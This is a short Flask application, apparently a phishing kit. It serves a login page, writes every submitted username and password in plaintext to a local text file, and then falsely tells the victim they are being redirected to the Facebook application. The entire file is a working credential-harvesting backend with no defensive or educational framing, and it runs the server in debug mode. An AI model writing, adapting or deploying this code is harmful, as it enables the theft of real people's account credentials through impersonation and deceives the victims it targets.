from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    with open("datos_ingresados.txt", "a") as archivo:
        archivo.write(f"Usuario: {usuario} | Contraseña: {contrasena}\n")

    return f"<h2> ¡Sera redireccionado a la aplicacion de Facebook!</h2><a href='/'>Volver</a>"

if __name__ == '__main__':
    app.run(debug=True)
